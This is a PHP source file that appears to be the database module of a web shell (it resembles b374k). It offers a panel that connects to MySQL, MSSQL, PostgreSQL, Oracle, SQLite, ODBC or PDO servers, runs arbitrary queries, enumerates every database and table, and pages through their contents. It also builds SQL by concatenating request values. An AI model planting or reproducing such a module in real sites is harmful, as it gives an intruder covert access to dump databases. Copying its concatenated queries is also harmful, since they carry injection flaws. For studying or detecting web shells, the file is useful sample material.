<?php
$GLOBALS['module']['database']['id'] = "database";
$GLOBALS['module']['database']['title'] = "Database";
$GLOBALS['module']['database']['js_ontabselected'] = "";
$GLOBALS['module']['database']['content'] = "
<table class='boxtbl'>
<thead>
	<tr><th colspan='3'><p class='boxtitle'>Connect</p></th></tr>
</thead>
<tbody>
	<tr class='dbHostRow'><td style='width:144px' class='dbHostLbl'>Host</td><td colspan='2'><input type='text' id='dbHost' value='' onkeydown=\"trap_enter(event, 'db_connect');\"></td></tr>
	<tr class='dbUserRow'><td>Username</td><td colspan='2'><input type='text' id='dbUser' value='' onkeydown=\"trap_enter(event, 'db_connect');\"></td></tr>
	<tr class='dbPassRow'><td>Password</td><td colspan='2'><input type='text' id='dbPass' value='' onkeydown=\"trap_enter(event, 'db_connect');\"></td></tr>
	<tr class='dbPortRow'><td>Port (Optional)</td><td colspan='2'><input type='text' id='dbPort' value='' onkeydown=\"trap_enter(event, 'db_connect');\"></td></tr>
</tbody>
<tfoot>
	<tr class='dbConnectRow'>
		<td style='width:144px;'>
			<select id='dbType'>
			</select>
		</td>
		<td style='width:120px;'><span class='button' onclick=\"db_connect();\">connect</span></td>
		<td class='dbError'></td>
	</tr>
	<tr class='dbQueryRow' style='display:none;'>
		<td colspan='3'><textarea id='dbQuery' style='min-height:140px;height:140px;'>You can also press ctrl+enter to submit</textarea></td>
	</tr>
	<tr class='dbQueryRow' style='display:none;'>
		<td style='width:120px;'><span class='button' onclick=\"db_run();\">run</span></td>
		<td style='width:120px;'><span class='button' onclick=\"db_disconnect();\">disconnect</span></td>
		<td>Separate multiple commands with a semicolon <span class='strong'>(</span> ; <span class='strong'>)</span></td>
	</tr>
</tfoot>
</table>
<div id='dbBottom' style='display:none;'>
<br>
<table class='border' style='padding:0;'><tr><td id='dbNav' class='colFit borderright' style='vertical-align:top;'></td><td id='dbResult' style='vertical-align:top;'></td></tr></table>
</div>
";

if(!function_exists('sql_connect')){
	function sql_connect($sqltype, $sqlhost, $sqluser, $sqlpass){
		if($sqltype == 'mysql'){
			if(class_exists('mysqli')) return new mysqli($sqlhost, $sqluser, $sqlpass);
			elseif(function_exists('mysql_connect')) return @mysql_connect($sqlhost, $sqluser, $sqlpass);
		}
		elseif($sqltype == 'mssql'){
			if(function_exists('sqlsrv_connect')){
				$coninfo = array("UID"=>$sqluser, "PWD"=>$sqlpass);
				return @sqlsrv_connect($sqlhost,$coninfo);
			}
			elseif(function_exists('mssql_connect')) return @mssql_connect($sqlhost, $sqluser, $sqlpass);
		}
		elseif($sqltype == 'pgsql'){
			$hosts = explode(":", $sqlhost);
			if(count($hosts)==2){
				$host_str = "host=".$hosts[0]." port=".$hosts[1];
			}
			else $host_str = "host=".$sqlhost;
			if(function_exists('pg_connect')) return @pg_connect("$host_str user=$sqluser password=$sqlpass");
		}
		elseif($sqltype == 'oracle'){ if(function_exists('oci_connect')) return @oci_connect($sqluser, $sqlpass, $sqlhost); }
		elseif($sqltype == 'sqlite3'){
			if(class_exists('SQLite3')) if(!empty($sqlhost)) return new SQLite3($sqlhost);
			else return false;
		}
		elseif($sqltype == 'sqlite'){ if(function_exists('sqlite_open')) return @sqlite_open($sqlhost); }
		elseif($sqltype == 'odbc'){ if(function_exists('odbc_connect')) return @odbc_connect($sqlhost, $sqluser, $sqlpass); }
		elseif($sqltype == 'pdo'){
			if(class_exists('PDO')) if(!empty($sqlhost)) return new PDO($sqlhost, $sqluser, $sqlpass);
			else return false;
		}
		return false;
	}
}

if(!function_exists('sql_query')){
	function sql_query($sqltype, $query, $con){
		if($sqltype == 'mysql'){
			if(class_exists('mysqli')) return $con->query($query);
			elseif(function_exists('mysql_query')) return mysql_query($query);
		}
		elseif($sqltype == 'mssql'){
			if(function_exists('sqlsrv_query')) return sqlsrv_query($con,$query);
			elseif(function_exists('mssql_query')) return mssql_query($query);
		}
		elseif($sqltype == 'pgsql') return pg_query($query);
		elseif($sqltype == 'oracle') return oci_execute(oci_parse($con, $query));
		elseif($sqltype == 'sqlite3') return $con->query($query);
		elseif($sqltype == 'sqlite') return sqlite_query($con, $query);
		elseif($sqltype == 'odbc') return odbc_exec($con, $query);
		elseif($sqltype == 'pdo') return $con->query($query);
	}
}

if(!function_exists('sql_num_rows')){
	function sql_num_rows($sqltype,$result){
		if($sqltype == 'mysql'){
			if(class_exists('mysqli_result')) return $result->mysqli_num_rows;
			elseif(function_exists('mysql_num_rows')) return mysql_num_rows($result);
		}
		elseif($sqltype == 'mssql'){
			if(function_exists('sqlsrv_num_rows')) return sqlsrv_num_rows($result);
			elseif(function_exists('mssql_num_rows')) return mssql_num_rows($result);
		}
		elseif($sqltype == 'pgsql') return pg_num_rows($result);
		elseif($sqltype == 'oracle') return oci_num_rows($result);
		elseif($sqltype == 'sqlite3'){
			$metadata = $result->fetchArray();
			if(is_array($metadata)) return $metadata['count'];
		}
		elseif($sqltype == 'sqlite') return sqlite_num_rows($result);
		elseif($sqltype == 'odbc') return odbc_num_rows($result);
		elseif($sqltype == 'pdo') return $result->rowCount();
	}
}

if(!function_exists('sql_num_fields')){
	function sql_num_fields($sqltype, $result){
		if($sqltype == 'mysql'){
			if(class_exists('mysqli_result')) return $result->field_count;
			elseif(function_exists('mysql_num_fields')) return mysql_num_fields($result);
		}
		elseif($sqltype == 'mssql'){
			if(function_exists('sqlsrv_num_fields')) return sqlsrv_num_fields($result);
			elseif(function_exists('mssql_num_fields')) return mssql_num_fields($result);
		}
		elseif($sqltype == 'pgsql') return pg_num_fields($result);
		elseif($sqltype == 'oracle') return oci_num_fields($result);
		elseif($sqltype == 'sqlite3') return $result->numColumns();
		elseif($sqltype == 'sqlite') return sqlite_num_fields($result);
		elseif($sqltype == 'odbc') return odbc_num_fields($result);
		elseif($sqltype == 'pdo') return $result->columnCount();
	}
}

if(!function_exists('sql_field_name')){
	function sql_field_name($sqltype,$result,$i){
		if($sqltype == 'mysql'){
			if(class_exists('mysqli_result')) { $z=$result->fetch_field();return $z->name;}
			elseif(function_exists('mysql_field_name')) return mysql_field_name($result,$i);
		}
		elseif($sqltype == 'mssql'){
			if(function_exists('sqlsrv_field_metadata')){
				$metadata = sqlsrv_field_metadata($result);
				if(is_array($metadata)){
					$metadata=$metadata[$i];
				}
				if(is_array($metadata)) return $metadata['Name'];
			}
			elseif(function_exists('mssql_field_name')) return mssql_field_name($result,$i);
		}
		elseif($sqltype == 'pgsql') return pg_field_name($result,$i);
		elseif($sqltype == 'oracle') return oci_field_name($result,$i+1);
		elseif($sqltype == 'sqlite3') return $result->columnName($i);
		elseif($sqltype == 'sqlite') return sqlite_field_name($result,$i);
		elseif($sqltype == 'odbc') return odbc_field_name($result,$i+1);
		elseif($sqltype == 'pdo'){
			$res = $result->getColumnMeta($i);
			return $res['name'];
		}
	}
}

if(!function_exists('sql_fetch_data')){
	function sql_fetch_data($sqltype,$result){
		if($sqltype == 'mysql'){
			if(class_exists('mysqli_result')) return $result->fetch_row();
			elseif(function_exists('mysql_fetch_row')) return mysql_fetch_row($result);
		}
		elseif($sqltype == 'mssql'){
			if(function_exists('sqlsrv_fetch_array')) return sqlsrv_fetch_array($result,1);
			elseif(function_exists('mssql_fetch_row')) return mssql_fetch_row($result);
		}
		elseif($sqltype == 'pgsql') return pg_fetch_row($result);
		elseif($sqltype == 'oracle') return oci_fetch_row($result);
		elseif($sqltype == 'sqlite3') return $result->fetchArray(1);
		elseif($sqltype == 'sqlite') return sqlite_fetch_array($result,1);
		elseif($sqltype == 'odbc') return odbc_fetch_array($result);
		elseif($sqltype == 'pdo') return $result->fetch(2);
	}
}

if(!function_exists('sql_close')){
	function sql_close($sqltype,$con){
		if($sqltype == 'mysql'){
			if(class_exists('mysqli')) return $con->close();
			elseif(function_exists('mysql_close')) return mysql_close($con);
		}
		elseif($sqltype == 'mssql'){
			if(function_exists('sqlsrv_close')) return sqlsrv_close($con);
			elseif(function_exists('mssql_close')) return mssql_close($con);
		}
		elseif($sqltype == 'pgsql') return pg_close($con);
		elseif($sqltype == 'oracle') return oci_close($con);
		elseif($sqltype == 'sqlite3') return $con->close();
		elseif($sqltype == 'sqlite') return sqlite_close($con);
		elseif($sqltype == 'odbc') return odbc_close($con);
		elseif($sqltype == 'pdo') return $con = null;
	}
}

if(!function_exists('sql_get_supported')){
	function sql_get_supported(){
		$db_supported = array();

		if(function_exists("mysql_connect")) $db_supported[] = 'mysql';
		if(function_exists("mssql_connect") || function_exists("sqlsrv_connect")) $db_supported[] = 'mssql';
		if(function_exists("pg_connect")) $db_supported[] = 'pgsql';
		if(function_exists("oci_connect")) $db_supported[] = 'oracle';
		if(function_exists("sqlite_open")) $db_supported[] = 'sqlite';
		if(class_exists("SQLite3")) $db_supported[] = 'sqlite3';
		if(function_exists("odbc_connect")) $db_supported[] = 'odbc';
		if(class_exists("PDO")) $db_supported[] = 'pdo';

		return implode(",", $db_supported);
	}
}

if(isset($p['dbGetSupported'])){
	$res = sql_get_supported();
	if(empty($res)) $res = "error";
	output($res);
}
elseif(isset($p['dbType'])&&isset($p['dbHost'])&&isset($p['dbUser'])&&isset($p['dbPass'])&&isset($p['dbPort'])){
	$type = $p['dbType'];
	$host = $p['dbHost'];
	$user = $p['dbUser'];
	$pass = $p['dbPass'];
	$port = $p['dbPort'];

	$con = sql_connect($type ,$host , $user , $pass);
	$res = "";

	if($con!==false){
		if(isset($p['dbQuery'])){
			$query = $p['dbQuery'];
			$pagination = "";
			if((isset($p['dbDB']))&&(isset($p['dbTable']))){
				$db = trim($p['dbDB']);
				$table = trim($p['dbTable']);
				$start = (int) (isset($p['dbStart']))? trim($p['dbStart']):0;
				$limit = (int) (isset($p['dbLimit']))? trim($p['dbLimit']):100;

				if($type=='mysql'){
					$query = "SELECT * FROM ".$db.".".$table." LIMIT ".$start.",".$limit.";";
				}
				elseif($type=='mssql'){
					$query = "SELECT TOP ".$limit." * FROM ".$db."..".$table.";";
				}
				elseif($type=='pgsql'){
					$query = "SELECT * FROM ".$db.".".$table." LIMIT ".$limit." OFFSET ".$start.";";
				}
				elseif($type=='oracle'){
					$limit = $start + $limit;
					$query = "SELECT * FROM ".$db.".".$table." WHERE ROWNUM BETWEEN ".$start." AND ".$limit.";";
				}
				elseif($type=='sqlite' || $type=='sqlite3'){
					$query = "SELECT * FROM ".$table." LIMIT ".$start.",".$limit.";";
				}
				else $query = "";

				$pagination = "Limit <input type='text' id='dbLimit' value='".html_safe($limit)."' style='width:50px;'>
								<span class='button' onclick=\"db_pagination('prev');\">prev</span>
								<span class='button' onclick=\"db_pagination('next');\">next</span>
								<input type='hidden' id='dbDB' value='".html_safe($db)."'>
								<input type='hidden' id='dbTable' value='".html_safe($table)."'>
								<input type='hidden' id='dbStart' value='".html_safe($start)."'>
								";
			}

			$querys = explode(";", $query);
			foreach($querys as $query){
				if(trim($query) != ""){
					$query_query = sql_query($type, $query, $con);
					if($query_query!=false){
						$res .= "<p>".html_safe($query).";&nbsp;&nbsp;&nbsp;<span class='strong'>[</span> ok <span class='strong'>]</span></p>";
						if(!empty($pagination)){
							$res .= "<p>".$pagination."</p>";
						}
						if(!is_bool($query_query)){
							$res .= "<table class='border dataView sortable tblResult'><tr>";
							for($i = 0; $i < sql_num_fields($type, $query_query); $i++)
								$res .= "<th>".html_safe(sql_field_name($type, $query_query, $i))."</th>";
							$res .= "</tr>";
							while($rows = sql_fetch_data($type, $query_query)){
								$res .= "<tr>";
								foreach($rows as $r){
									if(empty($r)) $r = " ";
									$res .= "<td>".html_safe($r)."</td>";
								}
								$res .= "</tr>";
							}
							$res .= "</table>";
						}
					}
					else{
						$res .= "<p>".html_safe($query).";&nbsp;&nbsp;&nbsp;<span class='strong'>[</span> error <span class='strong'>]</span></p>";
					}
				}
			}
		}
		else{
			if(($type!='pdo') && ($type!='odbc')){
				if($type=='mysql') $showdb = "SHOW DATABASES";
				elseif($type=='mssql') $showdb = "SELECT name FROM master..sysdatabases";
				elseif($type=='pgsql') $showdb = "SELECT schema_name FROM information_schema.schemata";
				elseif($type=='oracle') $showdb = "SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME";
				elseif(($type=='sqlite3') || ($type=='sqlite')) $showdb = "SELECT \"".$host."\"";
				else $showdb = "SHOW DATABASES";

				$query_db = sql_query($type, $showdb, $con);

				if($query_db!=false) {
					while($db_arr = sql_fetch_data($type, $query_db)){
						foreach($db_arr as $db){
							if($type=='mysql') $showtbl = "SHOW TABLES FROM ".$db;
							elseif($type=='mssql') $showtbl = "SELECT name FROM ".$db."..sysobjects WHERE xtype = 'U'";
							elseif($type=='pgsql') $showtbl = "SELECT table_name FROM information_schema.tables WHERE table_schema='".$db."'";
							elseif($type=='oracle') $showtbl = "SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='".$db."'";
							elseif(($type=='sqlite3') || ($type=='sqlite')) $showtbl = "SELECT name FROM sqlite_master WHERE type='table'";
							else $showtbl = "";

							$res .= "<p class='boxtitle boxNav' style='padding:8px 32px;margin-bottom:4px;'>".$db."</p><table class='border' style='display:none;margin:8px 0;'>";
							$query_table = sql_query($type, $showtbl, $con);

							if($query_table!=false){
								while($tables_arr = sql_fetch_data($type, $query_table)){
									foreach($tables_arr as $table) $res .= "<tr><td class='dbTable borderbottom' style='cursor:pointer;'>".$table."</td></tr>";
								}
							}
							$res .= "</table>";
						}
					}
				}
			}
		}
	}
	if(!empty($res)) output($res);
	output('error');
}

?>